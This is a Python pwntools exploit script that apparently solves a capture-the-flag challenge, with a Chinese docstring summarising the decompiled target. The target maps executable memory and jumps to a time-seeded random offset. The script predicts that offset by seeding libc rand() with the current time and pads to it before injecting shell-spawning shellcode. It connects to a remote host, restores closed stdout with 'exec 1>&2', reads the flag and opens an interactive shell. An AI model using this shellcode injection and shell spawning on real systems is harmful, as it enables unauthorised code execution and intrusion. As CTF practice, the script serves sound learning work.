"""随便乱搞的shellcode
  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
  read(0, buf, 0x100uLL);
  v3 = time(0LL);
  srand(v3);
  bufa = (void (*)(void))&buf[rand() % 256];
  close(1);
close(1) -- 关闭了标准输出, exec 1>&2 重定向到错误就能输出了
"""
from ctypes import *
from pwn import *


def init():
    global libc
    import datetime
    date = datetime.datetime.now()
    date_seed = int(date.timestamp())
    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(date_seed)


def get_rand():
    rand = libc.rand()
    return rand


p = remote('8.130.35.16', 51003)
context(log_level='debug', arch='amd64', os='linux')

p.recvuntil('code:')
init()
rand = get_rand()
sc = asm(shellcraft.sh())

success('rand: ' + hex(rand) + ', %256:' + hex(rand % 256))
payload = flat('a'.ljust(rand % 256, 'a').encode() + sc)

p.send(payload)
p.sendline('exec 1>&2')
p.sendline('cat flag')
p.interactive()
